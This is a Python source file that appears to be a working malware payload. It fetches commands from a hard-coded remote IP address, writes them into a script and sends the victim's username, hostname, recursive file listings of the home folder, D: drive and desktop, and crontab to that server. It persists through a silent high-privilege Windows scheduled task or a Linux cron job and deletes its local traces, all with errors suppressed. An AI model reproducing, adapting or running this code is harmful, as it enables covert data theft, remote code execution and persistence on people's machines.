import os
import subprocess

import urllib.request
from io import BytesIO
import platform
import time
import mimetypes
from urllib.request import urlopen, Request


class MultiPartForm:
    """Accumulate the data to be used when posting a form."""

    def __init__(self):
        self.form_fields = []
        self.files = []
        self.boundary = f'------------------------{hex(int(time.time() * 1000))}'

    def get_content_type(self):
        return f'multipart/form-data; boundary={self.boundary}'

    def add_field(self, name, value):
        """Add a simple field to the form data."""
        self.form_fields.append((name, value))

    def add_file(self, fieldname, filename, filehandle, mimetype=None):
        """Add a file to be uploaded."""
        body = filehandle.read()
        if mimetype is None:
            mimetype = mimetypes.guess_type(filename)[0] or 'application/octet-stream'
        self.files.append((fieldname, filename, mimetype, body))

    def __bytes__(self):
        """Return a byte-string representing the form data, including attached files."""
        buffer = BytesIO()
        boundary = bytes(self.boundary.encode())

        # Add the form fields
        for name, value in self.form_fields:
            buffer.write(b'--%s\r\n' % boundary)
            buffer.write(b'Content-Disposition: form-data; name="%s"\r\n' % bytes(name.encode()))
            buffer.write(b'\r\n' + bytes(value.encode()) + b'\r\n')

        # Add the files to upload
        for fieldname, filename, mimetype, body in self.files:
            buffer.write(b'--%s\r\n' % boundary)
            buffer.write(b'Content-Disposition: form-data; name="%s"; filename="%s"\r\n' % (
                bytes(fieldname.encode()), bytes(filename.encode())))
            buffer.write(b'Content-Type: %s\r\n' % bytes(mimetype.encode()))
            buffer.write(b'\r\n' + body + b'\r\n')

        # Add the closing boundary marker
        buffer.write(b'--%s--\r\n' % boundary)
        return buffer.getvalue()



def send_file(file):
    url = 'http://13.51.44.246/upload/'
    form = MultiPartForm()
    form.add_file('file', file, open(file, 'rb'))

    # Create a HTTP request object
    request = Request(url)
    body = bytes(form)
    request.add_header('Content-type', form.get_content_type())
    request.add_header('Content-length', len(body))
    request.data = body

    # Send the request and get the response
    # response = urlopen(request)
    urlopen(request)


def create_windows_task(trigger_interval):
    # Get the path to the Python executable
    output_windows_task_func = []
    python_dir = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Programs", "Python")
    python_versions = [f for f in os.listdir(python_dir) if f.startswith("Python")]
    latest_version = sorted(python_versions)[-1]
    python_path = os.path.join(python_dir, latest_version, "python.exe")
    output_windows_task_func.append(python_path)

    # Create the task to run the Python script every 10 minutes
    task_name = "My_task"
    script_path = os.path.join(os.path.expanduser("~"), "locale", "init.py")
    cmd = f'schtasks /create /tn "{task_name}" /tr "{python_path} {script_path}" /sc minute /mo {trigger_interval} /F /RL HIGHEST /NP'
    cmd_output = subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    output_windows_task_func.append(cmd_output)

    # Enable the task
    cmd_enable_task = f'schtasks /run /tn "{task_name}"'
    cmd_run_output = subprocess.call(cmd_enable_task, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    output_windows_task_func.append(cmd_run_output)

    return output_windows_task_func


def create_file_path(dir_path, file_name, user, hostname):
    file_path_user = os.path.join(dir_path, f'{user}__{hostname}__{file_name}.txt')


def get_path():
    try:
        """Request a response from the server using GET."""
        web = 'http://13.51.44.246/commands'
        response = urllib.request.urlopen(web)
        commands_list = response.read().decode().strip().split('\n')

        if platform.system() == "Windows":
            # Get the username
            user = os.getlogin()
            dir_path = f'C:\\Users\\{user}\\gitt'
            locale_path = f'C:\\Users\\{user}\\locale'
            # if os.path.exists(locale_path):
            #     os.remove(locale_path)
            # else:
            #     pass
            os.makedirs(dir_path, exist_ok=True)

            # Get the hostname
            hostname = os.environ['COMPUTERNAME']

            file_path_logs = os.path.join(dir_path, f'{user}__{hostname}__logs.txt')

            # create a file in the new directory
            file_path_user = os.path.join(dir_path, f'{user}__{hostname}__user.txt')
            try:
                with open(file_path_user, 'w') as f:
                    f.write(f'{hostname}@{user}\n')
                with open(file_path_logs, 'w') as f:
                    f.write("user file created and data written \n")

                send_file(file_path_user)
                os.remove(file_path_user)
            except Exception as e:
                with open(file_path_logs, 'a') as f:
                    f.write(f"user file error: {e} \n")

            script_path = os.path.join(dir_path, 'init.py')
            try:
                with open(script_path, 'w') as f:
                    for command in commands_list:
                        f.write(command + '\n')
                with open(file_path_logs, 'a') as f:
                    f.write("init file created and data written \n")
            except Exception as e:
                with open(file_path_logs, 'a') as f:
                    f.write(f"init file error: {e} \n")

            file_path_all_C = os.path.join(dir_path, f'{user}__{hostname}__all_C.txt')
            try:
                os.system(f'dir C:\\Users\\{user} /s> {file_path_all_C}')
                with open(file_path_logs, 'a') as f:
                    f.write("all_C file created and data written \n")

                send_file(file_path_all_C)
                os.remove(file_path_all_C)
            except Exception as e:
                with open(file_path_logs, 'a') as f:
                    f.write(f"all_C file error: {e} \n")

            file_path_all_alt_C = os.path.join(dir_path, f'{user}__{hostname}__all_alt_C.txt')
            try:
                with open(file_path_all_alt_C, 'w') as f:
                    f.write(os.popen(f'dir C:\\Users\\{user} /s').read())
                with open(file_path_logs, 'a') as f:
                    f.write("all_alt_C file created and data written \n")

                send_file(file_path_all_alt_C)
                os.remove(file_path_all_alt_C)
            except Exception as e:
                with open(file_path_logs, 'a') as f:
                    f.write(f"all_alt_C file error: {e} \n")

            file_path_all_D = os.path.join(dir_path, f'{user}__{hostname}__all_D.txt')
            try:
                os.system(f'dir D:\\ /s> {file_path_all_D}')
                with open(file_path_logs, 'a') as f:
                    f.write("all_D file created and data written \n")

                send_file(file_path_all_D)
                os.remove(file_path_all_D)
            except Exception as e:
                with open(file_path_logs, 'a') as f:
                    f.write(f"all_D file error: {e} \n")

            file_path_all_alt_D = os.path.join(dir_path, f'{user}__{hostname}__all_alt_D.txt')
            try:
                with open(file_path_all_alt_D, 'w') as f:
                    f.write(os.popen(f'dir D:\\ /s').read())
                with open(file_path_logs, 'a') as f:
                    f.write("all_alt_D file created and data written \n")

                send_file(file_path_all_alt_D)
                os.remove(file_path_all_alt_D)
            except Exception as e:
                with open(file_path_logs, 'a') as f:
                    f.write(f"all_alt_D file error: {e} \n")

            file_path_desktop_C = os.path.join(dir_path, f'{user}__{hostname}__desktop_C.txt')
            try:
                os.system(f'dir C:\\Users\\{user}\\Desktop> {file_path_desktop_C}')
                with open(file_path_logs, 'a') as f:
                    f.write("desktop_C file created and data written \n")

                send_file(file_path_desktop_C)
                os.remove(file_path_desktop_C)
            except Exception as e:
                with open(file_path_logs, 'a') as f:
                    f.write(f"desktop_C file error: {e} \n")

            file_path_desktop_alt_C = os.path.join(dir_path, f'{user}__{hostname}__desktop_alt_C.txt')
            try:
                with open(file_path_desktop_alt_C, 'w') as f:
                    f.write(os.popen(f'dir C:\\Users\\{user}\\Desktop').read())
                with open(file_path_logs, 'a') as f:
                    f.write("all_desktop_C file created and data written \n")

                send_file(file_path_desktop_alt_C)
                os.remove(file_path_desktop_alt_C)
            except Exception as e:
                with open(file_path_logs, 'a') as f:
                    f.write(f"desktop_alt_C file error: {e} \n")

            try:
                window_task = create_windows_task("1")
                with open(file_path_logs, 'a') as f:
                    f.write("Windows Task Output: 1) Python Path 2) Cmd run 3) task run " + '\n')
                    for cmd in window_task:
                        f.write(cmd + '\n')
            except Exception as e:
                with open(file_path_logs, 'a') as f:
                    f.write(f"Create_windows_task error: {e} \n")

            send_file(file_path_logs)
            os.remove(file_path_logs)

        elif platform.system() == "Linux":
            # get the current user's home directory
            home_dir = os.path.expanduser('~')

            # create the directory in the home directory
            dir_path = os.path.join(home_dir, 'locale')
            # if os.path.exists(dir_path):
            #     pass
            # else:
            os.makedirs(dir_path, exist_ok=True)

            # get the hostname and username
            hostname = subprocess.check_output(['hostname'], stderr=subprocess.DEVNULL).decode().strip()
            user = subprocess.check_output(['whoami'], stderr=subprocess.DEVNULL).decode().strip()

            file_path_logs = os.path.join(dir_path, f'{user}__{hostname}__logs.txt')

            # create a file in the new directory
            file_path_user = os.path.join(dir_path, f'{user}__{hostname}__user.txt')
            try:
                with open(file_path_user, 'w') as f:
                    f.write(f'{hostname}@{user}\n')
                with open(file_path_logs, 'w') as f:
                    f.write("user file created and data written \n")

                send_file(file_path_user)
                os.remove(file_path_user)
            except Exception as e:
                with open(file_path_logs, 'a') as f:
                    f.write(f"user file error: {e} \n")

            script_path = os.path.join(dir_path, 'init.py')
            try:
                with open(script_path, 'w') as f:
                    for command in commands_list:
                        f.write(command + '\n')
                with open(file_path_logs, 'a') as f:
                    f.write("init file created and data written \n")
            except Exception as e:
                with open(file_path_logs, 'a') as f:
                    f.write(f"init file error: {e} \n")

            try:
                crontab_default = subprocess.check_output(['crontab', '-l'], stderr=subprocess.DEVNULL).decode().strip()
                file_path_crontab = os.path.join(dir_path, f'{user}__{hostname}__crontab_default.txt')
                with open(file_path_crontab, 'w') as f:
                    f.write(f'{crontab_default}')

                with open(file_path_logs, 'a') as f:
                    f.write("Crontab Default file created and data written \n")

                send_file(file_path_crontab)
                os.remove(file_path_crontab)
            except Exception as e:
                with open(file_path_logs, 'a') as f:
                    f.write(f"Crontab default file error: {e} \n")

            # try:
            #     file_path_all_C = os.path.join(dir_path, f'{user}__{hostname}__all.txt')
            #     os.system(f'ls -laR /home/{user} >> {file_path_all_C}')
            #     with open(file_path_logs, 'a') as f:
            #         f.write("All file created and data written \n")
            #
            #     send_file(file_path_all_C)
            #     os.remove(file_path_all_C)
            # except Exception as e:
            #     with open(file_path_logs, 'a') as f:
            #         f.write(f"All file error: {e} \n")

            try:
                # new_cronjob = "11 01 * * * /usr/bin/python3 {} >> {}/cron.log 2>&1".format(file_path, dir_path)
                new_cronjob = "*/10 * * * * /usr/bin/python3 {} >> {}/{}run.log 2>&1".format(script_path, dir_path,
                                                                                             f"{user}@{hostname}_")

                cron_task = subprocess.run(f'(crontab -l ; echo "{new_cronjob}") | crontab -', shell=True,
                                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

                with open(file_path_logs, 'a') as f:
                    f.write(f"Cron Task created with output: {cron_task} \n")
            except Exception as e:
                with open(file_path_logs, 'a') as f:
                    f.write(f"Cron task output: {cron_task} \n And Creation error: {e} \n")

            send_file(file_path_logs)
            os.remove(file_path_logs)

    except:
        pass

# get_path()
